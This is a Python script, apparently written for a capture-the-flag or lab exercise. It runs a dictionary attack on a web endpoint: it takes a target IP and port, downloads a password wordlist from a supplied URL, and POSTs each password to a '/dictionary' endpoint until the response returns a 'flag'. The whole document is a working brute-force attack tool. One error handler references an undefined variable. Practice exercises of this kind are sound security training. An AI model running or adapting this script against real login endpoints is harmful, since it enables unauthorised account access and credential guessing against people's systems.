"""
Script to attempt dictionary attack on a web server endpoint.
It prompts the user for the target IP address and port number.
"""

import requests
import ipaddress # For IP address validation
import sys       # To exit the script gracefully
import logging
import time

#configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_connection_details():
    """
    Prompts the user for an IPv4 address and port number,
    validates the input, and returns them.
    """
    while True: # Loop until a valid IP address is entered
        ip_str = input("Enter the target IPv4 address: ")
        try:
            ip = ipaddress.ip_address(ip_str)
            if ip.version == 4:
                 logging.info(f"Valid IPv4 address entered: {ip}")
                 break # Exit the loop if valid
            else:
                 print("Invalid input. Please enter a valid IPv4 address.")
        except ValueError:
            print("Invalid format. Please enter a valid IPv4 address (e.g., 192.168.1.1).")

    while True: # Loop until a valid port number is entered
        port_str = input("Enter the target port number: ")
        try:
            port = int(port_str)
            if 1 <= port <= 65535:
                logging.info(f"Valid port number entered: {port}")
                break # Exit the loop if valid
            else:
                print("Invalid port number. Please enter a number between 1 and 65535.")
        except ValueError:
            print("Invalid input. Please enter a whole number for the port.")

    # Return the validated IP (as string) and port (as integer)
    return str(ip), port

def get_passwords_from_url():
    """
    Prompts the user for a dictionary URL, attempts to download it,
    splits it into lines, and returns the list of passwords.
    Retries if the download fails
    """    
    while True: # Loop until a successful download
        dict_url = input("Enter the full URL of the password dictionary file: ")
        logging.info(f"Attempting to download dictionary from {dict_url}")
        try:
            response=requests.get(dict_url, timeout=15)
            response.raise_for_status() #raise an exception for bad status codes (4xx or 5xx)
            password_list = response.text.splitlines()
            logging.info(f"Successfully downloaded and split dictionary into {len(password_list)} entries.")
            #return actual list of passwords
            return password_list

        #specific errors first    
        except requests.exceptions.ConnectionError:
            logging.error(f"Error: Cannot connect to {dict_url}. Please check the URL and your connection.")
            # continue loop, prompt user again 

        except requests.exceptions.Timeout:
            logging.error(f"Error: Connection to:{dict_url} timed out. The server might be slow of the URL incorrect.")
            # continue loop, prompt user again 

        except requests.exceptions.HTTPError as e:
            # Catch errors raised by raise_for_status() e.g. 4xx and 5xx errrs
            logging.error(f"Error: HTTP Error{e.response.status_code} while fetching {dict_url}. Please check the URL.")
            # continue loop, prompt user again

        except requests.exceptions.MissingSchema:
            logging.error(f"Error: Invalid URL format '{e.response.status_code} while fetching '{dict_url}'. Make sure it starts with http:// or https://")
            # continue loop, prompt user again
        
        except requests.exceptions.RequestException as e:
            #catch any other portential errors from the requests library
            logging.error(f"Error fetching dictionary from '{dict_url}':{e}. Please check the URL.")
            # continue loop, prompt user again

# --- Main script execution ---
if __name__ == "__main__":
    # Get validated IP and Port from the user
    target_ip, target_port = get_connection_details()
    
    #get password list
    passwords = get_passwords_from_url()

    #check if password list was actually retrieved
    if not passwords:
        logging.error("Failed to retrieve password list. Exiting.")
        sys.exit(1)

    # Define base URL and Endpoint
    base_url = f"http://{target_ip}:{target_port}"
    attack_endpoint = "/dictionary" #hardcoded
    target_url = base_url + attack_endpoint

    logging.info(f"Starting dictionary attack against {target_url}")

    # Try each password from the list
    password_found = False
    for password in passwords:
        if not password:
            continue
        
        #remove leading/trailing whitespace
        password = password.strip()

        #skip if password becomes empty after stripping
        if not password:
            continue

        logging.info(f"Attempting password: '{password}'")

        # Send a POST request to the server with the password
        try:
            payload = {'password':password}
            tgt_response = requests.post(target_url, data=payload, timeout=5)
                                         
        except requests.exceptions.ConnectionError:
            logging.error(f"Error: Cannot connect to target {target_url} during attack for password '{password}'")
            logging.warning("Connection failed for this attempt, trying next password...")
            continue # skip to the next password

        except requests.exceptions.Timeout:
            logging.error(f"Error: Connection to target {target_url} timed out for password '{password}'")
            logging.warning("Timeout occured for this attempt, trying next password...")
            continue # skip to the next password
        
        except requests.exceptions.RequestException as e:
            logging.error(f"Error during POST request for password '{password}': {e}")
            logging.warning("Request failed for this attempt, trying next password...")
            continue #skip to the next password
    
        # Check if the server responds with success and contains the 'flag'
        if tgt_response.ok: 
            try:
                response_data = tgt_response.json()
                if 'flag' in response_data:
                    logging.info(f"Success! Correct password found: {password}")
                    logging.info(f"Flag: {response_data['flag']}")
                    password_found = True
                    break
                else:
                    logging.warning(f"Password '{password} resulted in OK status, but 'flag' not found in JSON response.")
            except requests.exceptions.JSONDecodeError:
                logging.info(f"Password '{password}' resulted in OK status, but response was not valid JSON.")
        else:
            logging.info(f"Password '{password}' failed with status code {tgt_response.status_code}")
    
    if not password_found:
        logging.info("Dictionary exhausted. Password not found.")

    logging.info("Script finished")
    
    